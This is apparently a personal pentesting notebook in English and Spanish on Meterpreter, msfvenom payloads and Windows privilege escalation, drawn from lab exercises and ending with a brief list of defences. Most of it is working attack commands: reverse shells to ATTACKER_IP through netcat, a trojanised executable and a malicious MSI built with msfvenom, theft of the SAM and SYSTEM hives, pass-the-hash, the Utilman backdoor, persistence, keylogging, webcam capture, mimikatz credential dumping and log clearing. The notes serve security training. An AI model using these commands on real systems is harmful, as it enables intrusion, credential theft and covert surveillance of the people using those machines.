| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Put it on the corresponding folder
Grant permissions to `Everyone` to execute the payload:
```powershell
icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
```
Change the service's associated executable and account (**mind the spaces after the equal signs when using sc.exe**)
```powershell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">



### Listener revershell
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```

</div></div>

Restart the service.
```powershell
sc stop THMService
sc start THMService
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Service Object Permissions

</div>


 - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
- Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios

</div></div>

## Abusing dangerous privileges
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Rights that an account has to perform specific system-related tasks.
- Check them `whoami /priv`
- List of windows privileges [[List of windows privileges\|List of windows privileges]]
- List of Windows [[Exploitable privileges\|Exploitable privileges]].

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeBackup-SeRestore

</div>


- Allow any user **read and write** to any **file** in the system, **ignoring** any [[DACL\|DACL]]
- The idea is allow to certain users **perform backups without** full **admin privileges**
- An attacker can use many methods to escalate.

Example:
- One method consists of **coping the [[SAM\|SAM]]** and  SYSTEM `registry hives` to **extract** the local Administrator's **password hash.**
- The account is part of the "Backup Operators" group, granted the 2 privileges above

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Backup the SAM ans SYSTEM hashes
Create a file with the `registry hives` content:
```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Start simple smb server

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# smbserver
- [[smbserver.py\|smbserver.py]]
- Start a simple [[Hacking Ético y Pentesting/SMB\|SMB]] server
- Create a share named `public` pointing to the `share` directory
- On the attacker machine
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py
mkdir share
python smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

</div></div>


</div></div>

Copy to the attacker machine
```powershell
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
Retrieve passwords hashes

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# secretsdump
- [[secretsdump.py\|secretsdump.py]]
- Retrieve the users' password hashes:
- Dump hashes from the remote machine without executing any agent there.
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
python secretsdump.py -sam sam.hive -system system.hive LOCAL
```

</div></div>

Perform a [[Pass-the-Hash\|Pass-the-Hash]] attack

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# psexec
- [[psexec.py\|psexec.py]]
- To exec a [[Pass-the-Hash\|Pass-the-Hash]] attack
- Gain access to the target machine with `SYSTEM` privileges
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py
python psexec.py -hashes aad...e:8...4f5 administrator@VICTIM_IP
```
![Pasted image 20240822233408.png](/img/user/Pasted%20image%2020240822233408.png)

</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeTakeOwnership

</div>


- This privilege allows a user to **take ownership** of any object on the system.(**files or registry**)
- Search for a service running as `SYSTEM` and **take** ownership of the service's **executable**.

Example:
- Check privileges
```shell
whoami /priv
```
![Pasted image 20240823084610.png|600](/img/user/Pasted%20image%2020240823084610.png)

## Abusing utilman.exe
- We need GUI
- Built-on windows app to provide ease of access options during the lock screen
- Replace the original binary for a payload
- Take ownership
```powershell
takeown /f C:\Windows\System32\Utilman.exe
```
- Being the owner doesn't necessarily mean that we have privileges over it, but you can assign yourself any privileges you need.
- Give us full permissions
```powershell
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
- Replace `utilman.exe` with a copy of `cmd.exe`  on the `C:\Windows\System32\` folder
```powershell
copy cmd.exe utilman.exe
```
- Lock the screen from the start button
![Pasted image 20240823094514.png|200](/img/user/Pasted%20image%2020240823094514.png)
- Click on `ease of access` button and get a command prompt
![Pasted image 20240823094611.png|500](/img/user/Pasted%20image%2020240823094611.png)
## Meterpreter
- If we have a meterpreter session we can migrate to most privileged account using [[meterpreter#Migrate\|meterpreter#Migrate]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeImpersonate - SeAssignPrimaryToken

</div>


- Allow to impersonate other user. (Spawn a process or thread)
- `LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` already have such privileges to impersonate restricted accounts.
- [[ISS\|ISS]] create an restricted account called `iis apppool\defaultapppool`

Example
- Let's assume we have an [[Networking/FTP\|FTP]] service running with user `ftp`.
- Without impersonation, ff Ann login and try to access to her files, the `ftp` user try to access them using `ftp` token
![Pasted image 20240823104235.png|800](/img/user/Pasted%20image%2020240823104235.png)
- With Impersonation, the `ftp` user impersonate Ann and uses her token.
![Pasted image 20240823104521.png|800](/img/user/Pasted%20image%2020240823104521.png)
- As attacker, if we manage to take **control** of a **process** with the privileges above, we can **impersonate** any user **connecting** and **authenticating** to that process.
- To elevate privilages using such accounts we need.
	1. To spawn an malicious process to that user can connect and authenticate
	2. Find a way to force privileged users to connect and authenticate to the malicious process
	3.  We can use [[RogueWinRM\|RogueWinRM]]

Example
- Asumming we have a compromised website running on [[ISS\|ISS]] and we have an webshell
![Pasted image 20240823111923.png|500](/img/user/Pasted%20image%2020240823111923.png)

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">



### Listener revershell
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```

</div></div>

Use the webshell to trigger the exploit (may take 2 min to work)
```powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4747"
```
`-p` specify the executable to be run by the exploit
`-a` sets arguments to the `nc64.exe`
It's like `nc -e cmd.exe ATTACKER_IP 4747`
![Pasted image 20240823115456.png|500](/img/user/Pasted%20image%2020240823115456.png)


</div></div>

##  Abusing vulnerable software
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing unpatched software

</div>


- As the drivers, organisations and users may not update the software regularly.
List software using [[wmic\|wmic]]
```powershell
wmic product get name,version,vendor
```
- Search for exploits on
[[Exploit-DB\|Exploit-DB]], [[packet storm\|packet storm]] google or github

[[Case study Druva InSync 6.6.3\|Case study Druva InSync 6.6.3]]

</div></div>

## Harvesting passwords
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unattended lnstalls

</div>


- In wondows 32
- Los detalles de la instalación desatendida, como los ajustes de configuración utilizados durante el proceso de instalación, se almacenan en el archivo Unattend.xml.
- El archivo Unattend.xml se almacena en una de las siguientes ubicaciones:
```powershell
C:\Windows\Panther\\N de la siguiente manera
C:\Windows\Panther\NUnattend
C:\WindowsSystem32
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
you might encounter credentials:
```html
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Windows\|LFI-WordList-Windows]]

| File          | Descriptoin                                                |
| ------------- | ---------------------------------------------------------- |
| `c:\boot.ini` | contains the boot options for computers with BIOS firmware |




</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Powershell History

</div>


It can be retrieved by using the following command from a `cmd.exe` prompt:
Only work on `cmd.exe`
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Saved windows credentials

</div>


- Windows allows us to **use other users' credentials.**
- Also gives the option to **save these credentials on the system**.
List saved credentials:
```powershell
cmdkey /list
```
Example(user `mike.katz`):
![Pasted image 20240820193302.png|400](/img/user/Pasted%20image%2020240820193302.png)
if you notice any credentials worth trying, try it.
```powershell
runas /savecred /user:USER_NAME_HERE cmd.exe
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### ISS Configuration

</div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Internet Information Services
- default web server on Windows
- create an restricted account called `iis apppool\defaultapppool`

</div></div>


The config on websites on [[ISS\|ISS]] is stored in a file called `web.config`  and can store **password** for db or configured authentication mechanisms.
Might is on:
```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Example
![Pasted image 20240820191513.png](/img/user/Pasted%20image%2020240820191513.png)

Quick way to find database connection strings on the file:
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

</div></div>

### Retrieve Credentials From software
#### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### From PuTTY

</div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- SSH client commonly found on Windows.
- **Instead** of having to specify a **connection**'s parameters **every single time,** users can **store sessions** where the IP, user and other configurations can be stored for later use.
- Don't allow store SSH password
- Store proxy config including authentication credentials.

</div></div>

Retrieve the stored proxy credentials.
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
Simon Tatham is the creator of PuTTY
Example:
![Pasted image 20240820193930.png|500](/img/user/Pasted%20image%2020240820193930.png)

</div></div>

## Some easy ways
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scheduled Tasks

</div>


Can be `schtasks` or `at`
We can see tasks either lost its binary or it's using a binary you can modify.
General info:
```powershell
schtasks
```
Specific info
```powershell
schtasks /query /tn vulntask /fo list /v
```
![Pasted image 20240820201808.png|600](/img/user/Pasted%20image%2020240820201808.png)
**If we can** **modify** or overwrite the "Task to Run" **executable**, we can control what gets executed by the taskusr1 user, and **we have a simple priv escalation**
Check executable permissions.
```powershell
icacls
```

```powershell
icacls c:\tasks\schtask.bat
```
![Pasted image 20240820202243.png|600](/img/user/Pasted%20image%2020240820202243.png)
We have full access and can **modify** the file and **insert a payload**
For example, we have a revshell file `nc64.exe`
```powershell
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Now wait to the schedule task runs again or run manually (less probable)
```powershell
schtasks /run /tn vulntask
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### AlwaysInstallElevated

</div>


- Windows installer files (also known as .msi files) are used to install applications on the system.
- Usually run with the level of the user.
- Can be configured to run with higher privileges

Requires 2 registry values to be set.
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If it's correct, generate a malicious .msi file using [[Metasploit/Msfvenom\|msfvenom]]
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Run the handler
Copy to the msi to the victim and run it
```powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## DLL hijacking

</div>


Replace the DLL by a malicious

![Pasted_image_20230909115418.png](/img/user/attachments/Pasted_image_20230909115418.png)
## Exploit know vulnerabilities

Tools
	Robber
	PowerSploit


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Library hijack

</div>


OSX
	Dylib hijadt
		Scanner to detect vuln
	Tool to make thje hijack
		OyUbhijack

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Spectre and meltdown

</div>


Spectre y Meltdown son vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e
Intel.

Vulnerabilidad Spectre
	Los atacantes pueden aprovechar esta vulnerabilidad para leer ubicaciones de memoria adyacentes de un proceso y acceder a información para la que no está autorizado.
	Usando esta vulnerabilidad, un atacante puede incluso leer la memoria del kernel o realizar un ataque basado en la web usando JavaScript.

Vulnerabilidad Meltdown
	Los atacantes pueden aprovecharse de esta vulnerabilidad para escalar privilegios forzando a un proceso sin privilegios a leer otras ubicaciones de memoria adyacentes como la memoria del kernel y la memoria física.
	Esto lleva a revelar información critica del sistema como credenciales, claves privadas, etc.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Named pipe impersonation

</div>


- In windows
- En el sistema operativo Windows, Named Pipe con nombre proporcionan una comunicación legítima entre los sistemas en ejecución.
- Los atacantes a menudo explotan esta técnica para escalar privilegios en el sistema de la víctima a los de una cuenta de usuario que tiene mayores privilegios de acceso.
- Los atacantes utilizan herramientas como Metasplolt para realizar una impersonación de tuberías con nombre en un host de target.ç 
- Los atacantes utilizan comandos de Metasplolt como getsystem para obtener privilegios de nivel administrativo y extraer los hashes de las contraseñas de las cuentas de administrador/usuario.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Other techniques

</div>


- Manipulación de tokens de acceso
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Aplicación Shimming
El marco de compatibilidad de aplicaciones de Windows llamado Shim se utiliza para proporcionar compatibilidad entre las versiones más antiguas y más nuevas del sistema operativo Windows Shims como RedirectEXE, injectDLL y GetProcAddress pueden ser utilizados por los atacantes para escalar privilegios, instalar puertas traseras, desactivar Windows Defender, etc.
- Debilidad de los permisos del sistema de archivos
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Interceptación de rutas
Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y secuestro del orden de búsqueda que conducen a la interceptación de la ruta. La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
- Lauch Deamon
Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para cada daemon de lanzamiento a nivel de sistema. Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque. El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
- Plist Modification
Los archivos plist en MacOS y OS X describen cuándo deben ejecutarse los programas, la ruta del archivo ejecutable, los parámetros del programa, los permisos del sistema operativo necesarios, etc. Los atacantes alteran los archivos plist para ejecutar código malicioso en nombre de un usuario legítimo para escalar privilegios.
- Web Shell
Una shell web es un script basado en la web que permite el acceso a un servidor web. Los atacantes crean web shells para inyectar un script malicioso en un servidor web para mantener un acceso persistente y escalar privilegios.

![Pasted_image_20230909124442.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted_image_20230909124442.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Tools to escalate

</div>


### BeRoot 
es una herramienta de post-explotación para comprobar las configuraciones  rróneas más comunes para encontrar una forma de elevar los privilegios. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre los permisos de los servicios, los directorios en los que se puede escribir con sus ubicaciones, los permisos de las claves de inicio, etc.
### linpostexp
La herramienta linpostexp obtiene información detallada sobre el kernel,
que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre el kernel, los sistemas de archivos, el superusuario, los sudoers, la versión de sudo, etc. Los atacantes pueden utilizar esta información para explotar las vulnerabilidades presentes en el kernel para elevar sus privilegios. El siguiente comando se utiliza para extraer esta información sobre el sistema de destino: #python linprivchecker.py


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## How to defend escalate Windows

</div>


■ Restringir los privilegios de inicio de sesión interactiva.
■ Ejecutar usuarios y aplicaciones con los privilegios más bajos.
■ Implementar la autenticación y la autorización multifactoriales.
■ Ejecutar servicios como cuentas sin privilegios.
■ Implementar una metodología de separación de privilegios para limitar el alcance de los errores y fallos de
programación.
■ Utilizar una técnica de cifrado para proteger los datos sensibles.
■ Reducir la cantidad de código que se ejecuta con un determinado privilegio.
■ Realizar la depuración utilizando comprobadores de límites y pruebas de esfuerzo.
■ Probar a fondo el sistema para detectar errores de codificación de la aplicación y bugs.
